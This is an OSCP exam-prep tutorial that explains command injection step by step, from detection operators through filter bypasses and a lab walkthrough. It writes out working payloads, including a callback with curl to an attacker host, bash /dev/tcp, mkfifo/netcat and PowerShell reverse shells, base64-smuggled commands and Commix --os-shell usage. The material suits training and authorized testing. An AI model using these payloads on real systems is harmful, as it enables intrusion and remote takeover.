# Command Injection — Complete Explained OSCP Guide

> **Scope:** Same full command injection methodology, now explained the way a teacher would walk you through it — every technique includes *what it is*, *why it works*, *how to use the tool*, and *what you should see*. `<ATTACKER_IP>` = your machine, `<TARGET_IP>` = the lab box being tested.

---

## Table of Contents

1. [What is Command Injection — The Concept](#1-what-is-command-injection--the-concept)
2. [Where to Look — Recognizing the Vulnerable Pattern](#2-where-to-look--recognizing-the-vulnerable-pattern)
3. [Step 1 — Finding the Vulnerability, Explained](#3-step-1--finding-the-vulnerability-explained)
4. [Step 2 — Injection Operators, Explained One by One](#4-step-2--injection-operators-explained-one-by-one)
5. [Step 3 — Detection Payloads, Explained](#5-step-3--detection-payloads-explained)
6. [Step 4 — Blind Injection via Timing, Explained](#6-step-4--blind-injection-via-timing-explained)
7. [Step 5 — Out-of-Band Confirmation, Explained](#7-step-5--out-of-band-confirmation-explained)
8. [Step 6 — Filter Bypass Techniques, Explained One by One](#8-step-6--filter-bypass-techniques-explained-one-by-one)
9. [Step 7 — Getting a Reverse Shell, Explained](#9-step-7--getting-a-reverse-shell-explained)
10. [Step 8 — Windows Command Injection, Explained](#10-step-8--windows-command-injection-explained)
11. [Step 9 — Commix (The Automated Tool), Fully Explained](#11-step-9--commix-the-automated-tool-fully-explained)
12. [Step 10 — Burp Suite Workflow, Explained](#12-step-10--burp-suite-workflow-explained)
13. [Full Walkthrough With Reasoning at Every Step](#13-full-walkthrough-with-reasoning-at-every-step)
14. [Quick Reference Card](#14-quick-reference-card)

---

## 1. What is Command Injection — The Concept

**The core idea:** somewhere in the application's backend code, a developer took a piece of user input and pasted it directly into a string that gets handed to the operating system's shell. The shell doesn't know or care that part of that string came from a stranger on the internet — it just sees characters and interprets them according to normal shell syntax rules.

**Why this is dangerous, conceptually:** a shell command isn't just "one instruction." Shells have a whole grammar — semicolons separate commands, pipes feed one command's output into another, ampersands run things in the background. If user input lands inside that grammar unescaped, the user effectively gets to **write part of the shell script themselves.**

```python
# The vulnerable line, conceptually
os.system("ping -c 1 " + user_input)

# What the shell actually receives and parses, if user_input = "8.8.8.8; whoami":
ping -c 1 8.8.8.8; whoami
#                 ^
#                 The shell sees this semicolon and treats everything after
#                 it as a brand new, separate command — completely unrelated
#                 to "ping." It will run BOTH "ping -c 1 8.8.8.8" AND "whoami."
```

**Why this matters more than other injection types:** SQL injection gets you data from a database. Command injection gets you **arbitrary execution on the operating system itself** — which is why it's usually one of the fastest paths from "found a bug" to "have a shell" in the entire exam.

---

## 2. Where to Look — Recognizing the Vulnerable Pattern

The trick to *spotting* command injection isn't memorizing parameter names — it's recognizing **a feature that smells like it's calling an external program**, because most command injection happens when a web app is just a thin wrapper around a real OS utility instead of doing the work in pure code.

**The mental test to run on every feature you see:** *"If I were a lazy developer, would I have just shelled out to a command-line tool instead of writing this logic myself?"*

```
- A "ping this host" button       → almost certainly wraps the real `ping` command
- A "resolve this domain" tool    → probably wraps `nslookup` or `dig`
- "Convert this file to PDF"      → probably wraps `convert`, `pandoc`, or similar
- "Export report as ZIP"          → might wrap the `zip` command with a filename you control
- Router/IoT admin panels          → notoriously built by wrapping shell utilities directly
```

When you see one of these features, you immediately suspect command injection and go test it — not because of the parameter name, but because of **what the feature is doing under the hood.**

---

## 3. Step 1 — Finding the Vulnerability, Explained

### The method: send a value that's valid on its own, but ALSO contains an injection attempt tacked onto the end.

This matters because if you just send `;id` alone, the application might error out before ever reaching the vulnerable code path (because `;id` isn't a valid IP address, for example, and some validation might catch the obviously malformed input). By keeping the *original expected value* (`8.8.8.8`) and *appending* your injection, you give the application something it accepts as valid input on the surface, while still riding your payload along with it.

```bash
# This is why we always do this:
8.8.8.8; id
# NOT just:
; id

# The first form looks like a real IP to any naive validation, while still
# carrying our payload through to the shell command underneath
```

### How to actually test it — using curl, explained

```bash
curl "http://<TARGET_IP>/ping.php?ip=8.8.8.8;id"
```

**What's happening here:** `curl` is making an HTTP GET request where the `ip` parameter's value is `8.8.8.8;id`. If the backend PHP code does something like `shell_exec("ping -c 1 " . $_GET['ip'])`, then the actual shell command executed becomes `ping -c 1 8.8.8.8;id` — two commands, semicolon-separated.

**What you're looking for in the response:** the normal ping output (round-trip times, packet loss stats) PLUS something new that wasn't there before — specifically a line like `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, which is exactly what the `id` command prints. If you see that extra line appear, you've proven the shell executed your second command — **that's your confirmation of command injection.**

---

## 4. Step 2 — Injection Operators, Explained One by One

This section exists because picking the *right* operator for the situation matters — they don't all behave the same way, and using the wrong one can make you think injection failed when it actually didn't.

### `;` — the unconditional separator

**What it does:** tells the shell "run this command, then regardless of whether it succeeded or failed, run the next one too." This is the most reliable operator to try first because it doesn't care about exit codes.

```bash
8.8.8.8; whoami
```
**Why you'd choose this:** when you have no idea if the *first* command (the legitimate `ping`) will succeed or fail, `;` guarantees your injected command runs anyway.

### `&&` — the conditional "AND"

**What it does:** only runs the second command if the first one **succeeded** (returned exit code 0).

```bash
8.8.8.8 && whoami
```
**Why you'd choose this:** sometimes `;` gets filtered out by input validation, but `&&` slips through. Also useful as a secondary test — if `;` is blocked but `&&` works, you've learned something about the filter's blocklist.

### `||` — the conditional "OR"

**What it does:** only runs the second command if the first one **failed**.

```bash
8.8.8.8 || whoami
```
**Why you'd choose this:** if you deliberately send a malformed first command (like an invalid IP that causes `ping` to error out), `||` will reliably trigger your injected command — useful when `;` and `&&` are both filtered.

### `|` — the pipe

**What it does:** takes the *output* of the first command and feeds it as *input* to the second command. Both commands run regardless of success/failure — but the second command isn't really "independent," it receives the first one's output.

```bash
8.8.8.8 | whoami
```
**A subtlety to understand:** here, `whoami` doesn't actually care about ping's output (it ignores stdin), so this works essentially the same as `;` in practice for most injected commands. The pipe matters more when you specifically want to chain command output (e.g., `cat /etc/passwd | grep root`).

### Backticks and `$(...)` — command substitution

**What they do:** these don't run a *second, separate* command — they **substitute the output of an inner command directly into the middle of another command's arguments,** before that outer command even runs.

```bash
8.8.8.8`whoami`
8.8.8.8$(whoami)
```
**Why this is conceptually different and sometimes more useful:** if the application is doing something like `echo "Pinging: " . $ip`, command substitution lets you inject regardless of whether the surrounding code structure expects a "second command" at all — the substitution happens at the shell-parsing level, before anything is executed as a whole.

---

## 5. Step 3 — Detection Payloads, Explained

### Why `id` specifically, and not something else?

`id` is the standard first-choice detection command because its output is **short, predictable, and impossible to confuse with legitimate application output.** `uid=33(www-data) gid=33(www-data) groups=33(www-data)` doesn't look like anything a ping utility or DNS tool would ever normally print — so if you see it, there's no ambiguity about what happened.

```bash
; id
```

### Why we escalate to `cat /etc/passwd` afterward

Once `id` confirms basic command execution works, reading `/etc/passwd` proves something further: that you have a **real, usable shell context**, not some restricted sandboxed execution. `/etc/passwd` is world-readable on virtually every Linux system, so a successful read confirms you can interact with the filesystem freely — setting up confidence that a full reverse shell payload will also work.

```bash
; cat /etc/passwd
```

### The automated detection loop, explained

```bash
for payload in ";id" "&&id" "||id" "|id" '`id`' '$(id)'; do
    echo "[*] Testing: $payload"
    curl -s "http://<TARGET_IP>/ping.php?ip=8.8.8.8${payload}" | grep -i "uid="
done
```

**What this script is doing, step by step:** it loops through six different operator variants (since some get filtered and others don't), sends each one as a separate HTTP request, and pipes the response through `grep -i "uid="`. If ANY of those six requests returns a line containing `uid=`, that specific operator made it through whatever filtering exists on the target — and you now know exactly which syntax to use for everything that follows.

---

## 6. Step 4 — Blind Injection via Timing, Explained

### Why you'd need this at all

Sometimes the application's response looks **identical** whether your injection worked or not — maybe the ping result isn't even shown to you, just a generic "Request processed" message. In that case, you can't visually confirm anything by reading the response. But the *command still ran on the server* — you just can't see its output. Timing lets you prove execution happened even when you're blind to the output.

### How `sleep 5` proves it

`sleep 5` does exactly one thing: makes the shell pause for 5 seconds before continuing. If your injected `sleep 5` actually executed, the *entire HTTP response* will be delayed by roughly 5 seconds, because the web server's PHP/Python process is waiting for the shell command to finish before it can send its response back to you.

```bash
# First, establish what "normal" feels like
time curl -s "http://<TARGET_IP>/ping.php?ip=8.8.8.8"
# real    0m0.412s     ← this is your baseline

# Then, the same request but with an injected delay
time curl -s "http://<TARGET_IP>/ping.php?ip=8.8.8.8;sleep+5"
# real    0m5.430s     ← exactly ~5 seconds slower
```

**Why this comparison matters:** a single slow response could just be network jitter or server load. But a response that's *consistently* ~5 seconds slower, specifically correlated with the `sleep 5` you injected, and *only* when you inject it — that's a controlled experiment proving causation, not coincidence. This is genuinely the same logic as a scientific experiment: you have a control (baseline) and a variable you changed (the injected sleep), and you're measuring the specific effect of that one change.

### Why `+` in the URL instead of a literal space

`sleep+5` uses `+` because in a URL query string, `+` is the standard encoding for a literal space character. If you typed a real space, it would either break the URL or get auto-encoded by your tool anyway — using `+` explicitly avoids ambiguity.

---

## 7. Step 5 — Out-of-Band Confirmation, Explained

### Why timing sometimes still isn't enough

If the application processes your request **asynchronously** (e.g., it queues your ping request and a background worker runs it later, completely disconnected from your HTTP response timing), then even `sleep 5` won't show up as a delay in your response — the response comes back instantly regardless of what happens in the background. You need a way to detect execution that doesn't depend on the HTTP response *at all*.

### How the "callback" trick works

The idea: instead of trying to see evidence in the HTTP response, you make the **target server itself reach out to a machine you control.** If that callback arrives, you've proven code executed — completely independent of what the web response said.

```bash
# Step 1 — set up something on YOUR machine that will notice if anyone connects to it
nc -lvnp 80
```
**What this does:** `nc -lvnp 80` tells netcat to *listen* (`-l`) on port 80, in verbose mode (`-v`) so it prints connection details, without DNS resolution (`-n`, faster), on port 80 (`-p 80`). It just sits there waiting silently.

```bash
# Step 2 — inject a payload that makes the TARGET initiate an outbound connection to YOU
; curl http://<ATTACKER_IP>/
```
**What this does, on the target's side:** if your injection worked, the target server runs `curl http://<ATTACKER_IP>/`, which is the target reaching out across the network to your listening netcat session.

**What you'll see on your machine if it worked:**
```
listening on [any] 80 ...
connect to [<ATTACKER_IP>] from <TARGET_IP> [<TARGET_IP>] 54321
GET / HTTP/1.1
Host: <ATTACKER_IP>
User-Agent: curl/7.81.0
```

That incoming connection, with that specific timing right after you sent your payload, is undeniable proof: the target executed your command and reached out to you. There's no ambiguity left, even though the original HTTP response told you nothing at all.

---

## 8. Step 6 — Filter Bypass Techniques, Explained One by One

### Why filters exist and why they usually fail anyway

Developers (or WAFs) often try to block command injection by maintaining a **blocklist** — a list of "bad" characters or words to strip or reject (`;`, `|`, `&`, the word `cat`, etc.). The fundamental problem with blocklists is that shells have *many equivalent ways to express the same thing*, and the developer almost never thinks of all of them.

### Space filtering bypass — explained

**The scenario:** the filter strips or blocks literal space characters, assuming that without spaces, you can't form a multi-word command like `cat /etc/passwd`.

**Why `$IFS` defeats this:** `$IFS` stands for "Internal Field Separator" — a built-in shell variable that, by default, *contains* a space character (among other whitespace). The shell expands `$IFS` into its actual value (a space) before running the command, so `cat$IFS/etc/passwd` becomes, from the shell's perspective, exactly the same as `cat /etc/passwd` — just without ever typing a literal space character in your payload.

```bash
cat$IFS/etc/passwd
# The shell expands $IFS to a space internally, producing: cat /etc/passwd
```

**Why `<` (input redirection) also works:** `cat</etc/passwd` tells the shell to feed the *contents* of `/etc/passwd` into `cat`'s standard input, which produces the exact same visible output as `cat /etc/passwd` — again, with zero literal spaces in your payload.

### Blacklisted keyword bypass — explained

**The scenario:** the filter specifically looks for and blocks the literal string `cat` appearing anywhere in your input.

**Why `c''at` defeats this:** in bash, adjacent strings (even empty ones in quotes) get concatenated together before execution. `c''at` is really three pieces: `c`, an empty string `''`, and `at`. The shell glues them back together into `cat` at parse time — but the literal text the filter scanned never contained the substring `cat` as a contiguous block, so a naive string-match filter misses it entirely.

```bash
c''at /etc/passwd
# Shell reconstructs this as: cat /etc/passwd
```

**Why base64 smuggling is the "nuclear option" bypass:** if a filter is aggressive enough to block almost everything recognizable, you can encode your *entire* desired command as base64 — which looks like meaningless random characters to any filter — and only decode it back into a real command at the very last moment, on the shell itself.

```bash
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```
**Breaking this down:** `Y2F0IC9ldGMvcGFzc3dk` is the base64 encoding of the text `cat /etc/passwd`. The `echo ... | base64 -d` pipeline decodes it back into plain text, and the surrounding `$(...)` takes that decoded output and substitutes it in as if you'd typed it directly. To a filter scanning your raw input, none of the suspicious words (`cat`, `/etc/passwd`) ever appear — they only exist after decoding happens server-side.

---

## 9. Step 7 — Getting a Reverse Shell, Explained

### Why you set up the listener BEFORE sending the payload

This is a sequencing rule that trips people up constantly: a reverse shell payload makes the **target** initiate a connection **out** to you. If your listener isn't already running and waiting when that connection attempt happens, there's nothing on your end to "catch" it — the connection attempt will simply fail and you'll get nothing, even though your injection worked perfectly.

```bash
# ALWAYS do this first, before sending any reverse shell payload
nc -lvnp <LPORT>
```

### Breaking down the bash reverse shell payload itself

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'
```

**Piece by piece, what each part actually does:**
- `bash -i` — starts a new, *interactive* bash session (the `-i` flag is what gives you a proper interactive prompt rather than a non-interactive script-mode shell)
- `/dev/tcp/<ATTACKER_IP>/<LPORT>` — this isn't a real file; it's a special Linux feature where bash itself can open network sockets just by "opening" this pseudo-path, treating the network connection as if it were a file
- `>&` — redirects both standard output AND standard error into that socket connection
- `0>&1` — redirects standard input to come FROM that same socket (so whatever you type on your listening machine gets fed back into this bash session as if you'd typed it directly)

**Put together, the effect:** you've made the interactive bash session use the network socket as its terminal — your keystrokes on your attacker machine become this bash session's input, and its output streams back to you. That's what makes it feel like a normal shell, even though it's running on the remote machine.

### Why the mkfifo version exists as an alternative

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <LPORT> >/tmp/f
```

**Why you'd need this instead of the simpler nc -e version:** many modern netcat builds are deliberately compiled *without* the `-e` flag (which lets netcat directly execute a program and pipe its I/O), specifically because that flag makes building reverse shells too easy — it's considered a security risk by some distro maintainers. This mkfifo version achieves the *same effect* using only basic, universally-available building blocks:

- `mkfifo /tmp/f` creates a **named pipe** — a special file that acts as a pass-through channel between processes, rather than storing actual data
- `cat /tmp/f` reads whatever gets written into that pipe and outputs it
- `/bin/sh -i` is fed that output as its input, executing it as shell commands
- The results (`2>&1` merges error output with normal output) get piped into `nc`, which sends everything to your listening machine
- `>/tmp/f` at the very end completes the loop — netcat's incoming data from YOUR typed commands gets written back into the pipe, which `cat` then feeds into the shell

It's a more roundabout, manually-constructed circuit doing exactly what `nc -e` would do in one step — useful specifically because it doesn't depend on a netcat feature that might not be compiled in.

---

## 10. Step 8 — Windows Command Injection, Explained

### Why `sleep` doesn't work and `ping` does instead

Windows's `cmd.exe` has no built-in `sleep` command (it's not a standard Windows utility the way it is on Linux). The classic workaround exploits a side effect of the `ping` command: pinging localhost (`127.0.0.1`) a specific number of times takes a predictable amount of time, because each ping attempt waits roughly one second for a reply (or timeout) before moving to the next.

```cmd
8.8.8.8 & ping -n 6 127.0.0.1
```
**Why `-n 6` specifically:** `-n` sets the number of ping attempts. Six pings against localhost (which always responds near-instantly) still takes roughly 5-ish real seconds of wall-clock time, because of the small delay between each individual ping cycle — giving you the same kind of "measurable delay" you'd get from Linux's `sleep 5`, just achieved through a side effect rather than a dedicated command.

### Why the PowerShell reverse shell payload is so much longer than the bash one

PowerShell doesn't have a built-in, one-line equivalent to bash's `/dev/tcp` trick. Instead, the payload has to **manually build the entire networking loop itself**, piece by piece:

```powershell
$client=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>','<LPORT>')
```
This line explicitly creates a TCP socket connection object pointed at your attacker machine — there's no shortcut syntax for this in PowerShell the way `/dev/tcp` is a shortcut in bash.

```powershell
$stream=$client.GetStream()
```
Grabs the actual data stream object tied to that connection, since you'll need to manually read from and write to it.

```powershell
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){...}
```
This is a manually-written loop that keeps checking for incoming data (your typed commands from the attacker side) for as long as the connection stays open — there's no automatic "redirect everything" feature like bash's `>&`, so PowerShell has to explicitly loop and read each chunk of bytes itself.

```powershell
$sb=(iex $data 2>&1|Out-String)
```
`iex` (short for `Invoke-Expression`) is what actually *executes* whatever command text just arrived through the network stream, capturing both its normal output and any errors, then converting the result to plain text so it can be sent back.

**The overall takeaway:** the PowerShell payload looks intimidating because it's manually implementing, line by line, everything that bash gets "for free" through its `/dev/tcp` shortcut and `>&` redirection syntax. It's longer, but it's doing conceptually the exact same job.

---

## 11. Step 9 — Commix (The Automated Tool), Fully Explained

### What Commix actually does behind the scenes

Commix automates the entire manual process described in Sections 3-8: it takes the URL/parameter you point it at, and systematically tries a huge library of injection operators, encoding tricks, and filter bypasses — the same categories of payloads covered above, but at a scale and speed no human could match by hand. When it finds one that works, it tells you exactly which technique succeeded.

```bash
python3 commix.py --url="http://<TARGET_IP>/ping.php?ip=8.8.8.8"
```
**What happens when you run this:** Commix sends a long series of test requests, each with a slightly different injection payload/operator/encoding combination substituted into the `ip` parameter, and watches for behavioral differences in the responses (extra output, timing changes) — essentially automating everything you did manually in Section 5, but trying dozens of variations instead of six.

```bash
python3 commix.py --url="http://<TARGET_IP>/ping.php?ip=test" --os-shell
```
**What `--os-shell` specifically does:** once Commix has *confirmed* injection works and figured out which exact payload syntax the target accepts, this flag tells it to give YOU an interactive prompt where you can type OS commands directly — Commix handles wrapping each command you type in the correct injection syntax/operator automatically and shows you the result, effectively turning the confirmed vulnerability into a live interactive shell without you having to hand-craft each request.

**Why you'd still want to understand the manual technique even though this tool exists:** Commix can fail to detect more obscure/custom filter setups, and during the actual OSCP exam, you need to be able to explain and reproduce what happened manually — relying purely on a tool's output without understanding the underlying mechanism is a common way people get stuck when the automated tool doesn't immediately work.

---

## 12. Step 10 — Burp Suite Workflow, Explained

### Why Repeater specifically, and not just using curl

Burp's Repeater tool lets you take one captured HTTP request and resend it repeatedly with small modifications, while keeping the full request (headers, cookies, exact formatting) intact and visible. The advantage over curl: you can see the **complete, exact** request and response side by side, modify just the one parameter you're testing, and immediately see the full raw response — including headers and timing — without having to reconstruct the entire request by hand each time.

```
1. Intercept the request containing the vulnerable parameter
```
This captures the *exact* request your browser would normally send, including any session cookies or custom headers the app expects — details that are easy to forget if you were just manually building a curl command from scratch.

```
2. Send to Repeater (Ctrl+R)
```
This duplicates that captured request into a workspace where you can edit and resend it as many times as you like, without it actually being "live" until you click Send.

```
3. Replace parameter value with: 8.8.8.8;id
4. Send — check response for command output (uid=...)
```
Here you're doing exactly the same logical test as the curl detection method in Section 5 — but Burp shows you the complete raw response (not just what curl prints to your terminal), which makes it much easier to spot subtle output changes buried inside a larger HTML page.

```
7. Send to Intruder if you want to fuzz through a list of bypass payloads automatically
```
**Why Intruder specifically helps here:** Intruder lets you mark the exact position in the request where your payload goes, then automatically substitutes in every entry from a wordlist (e.g., a list of dozens of filter-bypass payloads from Section 8) one at a time, sending a separate request for each and showing you a sortable table of response lengths/status codes/timing — letting you spot which specific bypass payload produced a different/successful result, across many attempts, without manually editing and resending each one yourself.

---

## 13. Full Walkthrough With Reasoning at Every Step

**Scenario:** A lab web app has a "Network Diagnostic" page with a ping feature at `/ping.php?ip=`.

**Step 1 — Test the base functionality (establish what "normal" looks like):**
```bash
curl "http://<TARGET_IP>/ping.php?ip=8.8.8.8"
```
*Why this step matters:* you need a baseline of normal output before you can recognize when something extra/different appears later.

**Step 2 — Inject and confirm (test the hypothesis that this is vulnerable):**
```bash
curl "http://<TARGET_IP>/ping.php?ip=8.8.8.8;id"
```
*What you're checking for:* does the output now contain `uid=33(www-data)...` in addition to the normal ping output? If yes, the application is passing your raw input into a shell command unsanitized.

**Step 3 — Confirm full shell context, not just limited argument injection:**
```bash
curl "http://<TARGET_IP>/ping.php?ip=8.8.8.8;cat+/etc/passwd"
```
*Why go further than `id`:* this proves you're not just injecting into a *restricted* sub-context (e.g., injecting into ping's own argument list with limited effect) — you have genuine, broad shell command execution capability.

**Step 4 — Start your listener (sequencing matters — must happen before the payload is sent):**
```bash
nc -lvnp <LPORT>
```

**Step 5 — Send the reverse shell payload:**
```bash
curl "http://<TARGET_IP>/ping.php?ip=8.8.8.8;bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<LPORT>+0>%261'"
```
*Why the URL-encoding here:* characters like `&` and spaces have special meaning inside a URL itself (separating query parameters, etc.), separate from their special meaning in a shell. Encoding them (`%26` for `&`, `+` for space) ensures the URL is parsed correctly and your *intended* shell payload arrives at the server intact, rather than being mangled or truncated by URL parsing rules along the way.

**Step 6 — Catch the shell:**
```
connect to [<ATTACKER_IP>] from <TARGET_IP>
www-data@target:/var/www/html$
```
*What just happened, conceptually:* the target ran your injected bash command, which opened an outbound network connection back to your waiting listener, and wired its own interactive shell session to that connection.

**Step 7 — Stabilize (turn a "barebones" shell into a fully usable one):**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
*Why this is necessary:* a raw reverse shell typically lacks proper terminal features — Ctrl+C will kill your whole connection instead of just interrupting a command, there's no tab completion, and text editors like `vim`/`nano` often won't render correctly. Spawning a proper PTY (pseudo-terminal) through Python fixes this, giving you something that behaves like a real terminal session.

**Step 8 — Post-exploitation enumeration:**
```bash
id
sudo -l
find / -perm -4000 2>/dev/null
```
*Why these specific commands first:* `id` confirms exactly who you are, `sudo -l` instantly reveals any low-hanging privilege escalation paths the current user might have, and the SUID search is the single highest-value first enumeration step for finding a path to root on most Linux boxes.

---

## 14. Quick Reference Card

```
====================================================================
 COMMAND INJECTION — OSCP QUICK REFERENCE
====================================================================
 <ATTACKER_IP> = your machine     <TARGET_IP> = the lab box
====================================================================

[CORE CONCEPT]
  User input gets pasted unescaped into a shell command string.
  Shell operators (; && || | ` $()) let you append YOUR OWN command.

[WHERE TO LOOK]
  Any feature that probably wraps a real OS tool:
  ping/traceroute, DNS lookup, file conversion, export/backup buttons

[TEST METHOD — keep the valid input, APPEND your payload]
  8.8.8.8;id     (not just ;id alone — keeps validation happy)

[OPERATORS — pick based on what's filtered]
  ;      always runs second command regardless
  &&     only if first SUCCEEDED
  ||     only if first FAILED
  |      pipes output, both run
  `cmd`  $(cmd)   substitutes inner command's output inline

[BLIND CONFIRMATION — no visible output]
  Baseline: time curl ".../ping.php?ip=8.8.8.8"
  Injected: time curl ".../ping.php?ip=8.8.8.8;sleep+5"
  ~5 sec slower, consistently = confirmed (proves causation, not coincidence)

[FULLY BLIND — no timing difference either]
  nc -lvnp 80                          [listener, attacker]
  ;curl http://<ATTACKER_IP>/          [payload, makes target call YOU]

[FILTER BYPASSES]
  Space blocked    -> cat${IFS}/etc/passwd   (IFS = shell's internal space var)
  Keyword blocked  -> c''at /etc/passwd      (empty quotes break up the string)
  Heavy filtering  -> $(echo BASE64 | base64 -d)  (payload hidden as encoded text)

[REVERSE SHELL — set listener FIRST, always]
  nc -lvnp <LPORT>
  ;bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'
  (no nc -e available?) -> mkfifo-based version instead

[WINDOWS — no sleep, use ping as a delay substitute]
  8.8.8.8 & ping -n 6 127.0.0.1
  8.8.8.8 & powershell -nop -w hidden -c "$client=New-Object..."

[AUTOMATED TOOL]
  commix --url="http://<TARGET_IP>/ping.php?ip=test" --os-shell
  (automates Sections 3-8's manual testing at scale)

[STABILIZE SHELL — fixes Ctrl+C, tab-complete, text editors]
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z -> stty raw -echo -> fg -> export TERM=xterm
====================================================================
```

---

*This document is for authorized penetration testing, OSCP exam preparation, and CTF/lab competitions only. Always obtain written permission before testing systems you do not own.*
